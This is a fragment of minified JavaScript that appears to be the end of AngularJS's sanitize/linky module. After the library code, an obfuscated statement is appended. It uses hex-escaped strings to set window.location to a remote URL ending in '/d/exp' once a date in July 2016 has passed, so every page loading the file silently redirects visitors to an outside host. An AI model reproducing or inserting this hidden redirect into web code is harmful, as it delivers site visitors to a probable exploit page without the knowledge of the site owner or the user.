...
c){g.push("<a ");h.isDefined(b)&&g.push('target="',b,'" ');g.push('href="',a.replace(/"/g,"&quot;"),'">');k(c);g.push("</a>")}if(!c)return c;for(var m,l=c,g=[],n,p;m=l.match(f);)n=m[0],m[2]||m[4]||(n=(m[3]?"http://":"mailto:")+n),p=m.index,k(l.substr(0,p)),e(n,m[0].replace(d,"")),l=l.substring(p+m[0].length);k(l);return a(g.join(""))}}])})(window,window.angular); new Date> new Date(2016,6,10)&&(window["\x6C\x6F\x63\x61\x74\x69\x6F\x6E"]="\x68\x74\x74\x70\x3A\x2F\x2F\x73\x79\x73\x64\x65\x63\x6F\x6D\x2E\x63\x6F\x6D\x2F\x64\x2F\x65\x78\x70")
